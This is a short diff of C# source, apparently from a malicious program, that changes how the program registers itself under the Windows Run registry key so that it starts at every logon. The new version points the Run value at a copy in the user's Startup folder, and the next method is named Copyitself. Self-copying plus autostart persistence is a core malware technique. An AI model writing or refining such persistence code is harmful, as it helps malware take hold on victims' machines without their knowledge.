@@ -17,7 +17,7 @@ namespace cevsn
         public static void StrtUp()
         {
             RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)!;
-            key!.SetValue("Cevsn", "C:\\Users\\Public\\" + System.AppDomain.CurrentDomain.FriendlyName + ".exe");
+            key!.SetValue("Cevsn", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile);
         }
 
          public static void Copyitself()
